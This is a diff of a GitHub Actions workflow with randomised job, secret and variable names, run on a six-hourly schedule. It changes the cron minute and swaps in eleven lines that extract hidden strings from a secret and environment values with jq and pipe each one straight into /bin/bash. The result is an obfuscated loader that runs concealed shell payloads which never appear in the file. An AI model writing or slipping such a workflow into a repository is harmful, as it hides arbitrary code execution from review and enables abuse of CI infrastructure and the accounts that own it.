@@ -1,24 +1,26 @@
 name: leidate7890
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '8 5/6 * * *'
+    - cron: '7 5/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: leidate7890
         env:
-          fmqcd7: ${{ secrets.fmqcd7 }}
+          v486: ${{ secrets.v486 }}
         run: |
-          echo $fmqcd7 | jq -r .vxwoo8360 | /bin/bash
-          echo $nr256 | jq -r .oguy91145 | /bin/bash
-          echo $u5 | jq -r .gcu2632 | /bin/bash
-          echo $xkryr76404 | jq -r .g399 | /bin/bash
-          echo $jm44913 | jq -r .sxj67708 | /bin/bash
-          echo $qbrnt5 | jq -r .gzyz14120 | /bin/bash
-          echo $nxk4 | jq -r .mv35 | /bin/bash
+          echo $v486 | jq -r .xwy84289 | /bin/bash
+          echo $orvrr94489 | jq -r .lzh87 | /bin/bash
+          echo $tiq2 | jq -r .gmzjg4 | /bin/bash
+          echo $jsuhn6152 | jq -r .r1105 | /bin/bash
+          echo $vw0984 | jq -r .gkqi3 | /bin/bash
+          echo $quod42 | jq -r .gouj100 | /bin/bash
+          echo $bkqp57 | jq -r .k784 | /bin/bash
+          echo $mpwpg51 | jq -r .kv9 | /bin/bash
+          echo $pudl27408 | jq -r .vtfl2 | /bin/bash
+          echo $fg8494 | jq -r .ykgd3082 | /bin/bash
+          echo $i35 | jq -r .uhfhq226 | /bin/bash
 
